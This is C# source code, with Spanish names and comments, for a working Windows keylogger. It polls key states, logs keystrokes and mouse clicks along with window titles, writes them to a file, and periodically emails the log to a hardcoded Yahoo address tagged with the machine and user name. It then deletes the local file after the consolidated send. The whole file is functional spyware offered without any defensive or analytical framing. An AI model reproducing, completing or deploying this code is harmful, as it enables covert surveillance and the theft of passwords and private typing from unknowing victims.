using System;
using System.Collections.Generic;

using System.Runtime.InteropServices;
using System.IO;

using System.Text;

using System.Windows.Forms;

namespace KeyLoggerLocal
{
    public class KeyLogger
    {

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(System.Int32 vKey);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int MapVirtualKey(uint uCode, uint uMapType);

        private String keybuffer;
        private System.Timers.Timer CheckKey;
        private System.Timers.Timer FlushBuffer;
        private String file;
        private string directorio;
        private string nombreVentanaAnterior;

        private StreamWriter sw;

        private DateTime ultimoEnvioMailFrecuente =  DateTime.Now;
        private DateTime ultimoEnvioMailConsolidado = DateTime.Now;
        FileInfo fi;

        #region Propertys

        public Boolean Enabled
        {
            get
            {
                return CheckKey.Enabled && FlushBuffer.Enabled;
            }
            set
            {
                CheckKey.Enabled = value;
                FlushBuffer.Enabled = value;
            }
        }

        public Double FlushInterval
        {
            get
            {
                return FlushBuffer.Interval;
            }
            set
            {
                FlushBuffer.Interval = value;
            }
        }

        public Double CheckInterval
        {
            get
            {
                return CheckKey.Interval;
            }
            set
            {
                CheckKey.Interval = value;
            }
        }

        public String File
        {
            get
            {
                return file;
            }
            set
            {
                file = value;
            }
        }

        #endregion



        public KeyLogger(String filename)
        {
            keybuffer = string.Empty;
            int ubicacion = filename.LastIndexOf("\\");
            directorio = filename.Substring(0, ubicacion);
            Directory.CreateDirectory(directorio);

            this.File = filename;
            fi = new FileInfo(file);

            CheckKey = new System.Timers.Timer();
            CheckKey.Enabled = true;
            CheckKey.Elapsed += new System.Timers.ElapsedEventHandler(CheckKey_Elapsed);
            CheckKey.Interval = 10;

            FlushBuffer = new System.Timers.Timer();
            FlushBuffer.Enabled = true;
            FlushBuffer.Elapsed += new System.Timers.ElapsedEventHandler(FlushBuffer_Elapsed);
            FlushBuffer.Interval = 5000;
        }

        private void CheckKey_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
             foreach (Int32 h in Enum.GetValues(typeof(System.Windows.Forms.Keys)))
            {
                // Comprobamos si los bits mas significativos estan activos en caso afirmativo
                // añadimos el nombre correspondiente a la tecla pulsada al buffer
                if (GetAsyncKeyState(h) == -32767)
                {

                        //si digitaron Enter o Tab hay un salto de linea
                        if (h == (int)System.Windows.Forms.Keys.Enter || h == (int)System.Windows.Forms.Keys.Tab 
                            )
                        {
                            nombreVentanaAnterior = "";
                        }
                        
                    
                         
                        if (nombreVentanaActualIgualANombreVentanaAnterior())
                        {
                            // Si se dio click derecho o click izquierdo, 
                            if (h == (int)System.Windows.Forms.Keys.LButton
                                || h == (int)System.Windows.Forms.Keys.RButton)
                            {
                                keybuffer += " [click] ";
                            }
                            // si otro caracter
                            else
                            {
                                keybuffer += conversionCaracteres(h);
                            }
                                
                        }
                        else
                        {
                            string nombreVentana = getNombreVentanaActual();
                            string fecha = DateTime.Now.ToString("yyyy/MM/dd");
                            string hora = DateTime.Now.ToString("hh:mm:ss");

                            keybuffer += "\r\n[" + fecha + " " + hora + "\t" + nombreVentana.ToString() + "]\t\t\t" + conversionCaracteres(h);
                            nombreVentanaAnterior = nombreVentana.ToString();
                        }


                       
                    

                    // si es espacio
                    if (h ==(int)System.Windows.Forms.Keys.Space)
                    {
                        keybuffer += " ";
                    }
                    
                }
                   
            }
        }

        private bool nombreVentanaActualIgualANombreVentanaAnterior()
        {
            IntPtr manejadorVentanaActiva = GetForegroundWindow();
            int largoTituloVentana = GetWindowTextLength(manejadorVentanaActiva);
            StringBuilder nombreVentana = new StringBuilder(largoTituloVentana);

            GetWindowText(manejadorVentanaActiva, nombreVentana, largoTituloVentana);
            
            if (nombreVentana.ToString() == nombreVentanaAnterior)
                return true;
            else return false;
        }

        private string getNombreVentanaActual()
        {
            IntPtr manejadorVentanaActiva = GetForegroundWindow();
            int largoTituloVentana = GetWindowTextLength(manejadorVentanaActiva);
            StringBuilder nombreVentana = new StringBuilder(largoTituloVentana);

            GetWindowText(manejadorVentanaActiva, nombreVentana, largoTituloVentana);

            return nombreVentana.ToString();
        }

        private void FlushBuffer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            if (!nombreVentanaActualIgualANombreVentanaAnterior() || keybuffer.Length >= 400)
                Flush2File(file, true);
        }

  
        public void Flush2File(string file, bool append)
        {
            sw = null;
            sw = new StreamWriter(file, append);

            try
            {
                sw.Write((keybuffer));
                keybuffer = string.Empty;
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                sw.Close();
            }
            FlushBuffer.Enabled = false;
            FlushBuffer.Stop();
            EnviarMail();
        }

        public void EnviarMail()
        {
            //Envio de Minimo 800k - TOTAL y BORRADO DE ARCHIVO. RESET
            try
            {
                TimeSpan ts = DateTime.Now.Subtract(fi.CreationTime);
                fi = new FileInfo(file);
                //if (fi.Length/1024 > 800)
                if (DateTime.Now.Subtract(ultimoEnvioMailConsolidado).TotalHours > 3 || fi.Length >= 30000)
                {
                    Mailer.EnviarMail sendMail = new Mailer.EnviarMail();
                    if (sendMail.enviar(file, "haiver77@yahoo.com.ar", " CONSOLIDADO: " + Environment.MachineName + "/" + Environment.UserName))
                    {
                        fi = new FileInfo(file);
                        fi.CreationTime = DateTime.Now;
                        fi.LastWriteTime = DateTime.Now;
                        fi.Delete();
                        ultimoEnvioMailConsolidado = DateTime.Now;
                    }                   
                }

                //Envio Cada 1 Minutos (60)
                else if (DateTime.Now.Subtract(ultimoEnvioMailFrecuente).TotalMinutes > 40)
                {
                    Mailer.EnviarMail sendMail = new Mailer.EnviarMail();
                    sendMail.enviar(file, "haiver77@yahoo.com.ar", "FRECUENTE " + Environment.MachineName + "/" + Environment.UserName);
                    ultimoEnvioMailFrecuente = DateTime.Now;
                    sendMail = null;
                }
            }
            catch (Exception) {  }

           

            FlushBuffer.Enabled = true;
            FlushBuffer.Start();

        }

        public  string conversionCaracteres(Int32 tecla)
        {
            if (tecla >= (int)Keys.A && tecla <= (int)Keys.Z)
            {
                return getNombreTecla(tecla);
            }
            if (tecla == (int)Keys.Divide)
            {
                return "/";
            }
            if (tecla >= (int)Keys.F1 && tecla <= (int)Keys.F24)
            {
                return " [" + getNombreTecla(tecla) + "] ";
            }
            if (tecla == (int)Keys.Multiply)
            {
                return "*";
            }
            if (tecla == (int)Keys.Separator)
            {
                return "-";
            }
            if (tecla == (int)Keys.Oemtilde)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaTilde] ";
            }
            if (tecla == (int)Keys.OemSemicolon)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaPuntoYComa] ";
            }
            if (tecla == (int)Keys.OemQuestion)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaSignoInterrogación] ";
            }
            if (tecla == (int)Keys.Oemplus)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaSignoMas] ";
            }
            if (tecla == (int)Keys.OemQuotes)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaComillasSimplesYDobles] ";
            }
            if (tecla == (int)Keys.OemPipe)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaBarraVertical] ";
            }
            if (tecla == (int)Keys.OemPeriod)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaPunto] ";
            }
            if (tecla == (int)Keys.OemOpenBrackets)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaCorcheteApertura] ";
            }
            if (tecla == (int)Keys.OemMinus)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaMenos] ";
            }
            if (tecla == (int)Keys.Oemcomma)
            {    
                return "[" + getNombreTecla(tecla) + ":TeclaComa]";
            }
            if (tecla == (int)Keys.OemCloseBrackets)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaCorcheteCierra] ";
            }
            if (tecla == (int)Keys.OemBackslash)
            {
                return " [" + getNombreTecla(tecla) + ":TeclaBarraDiagonalInversa] ";
            }
            if (tecla >= (int)Keys.Oem1 && tecla <= (int)Keys.Oem8)
            {
                return " [" + getNombreTecla(tecla) + "] ";
            }

            return "";
        }

        public string getNombreTecla(int tecla)
        {
             return Enum.GetName(typeof(System.Windows.Forms.Keys), tecla);

        }
    }
}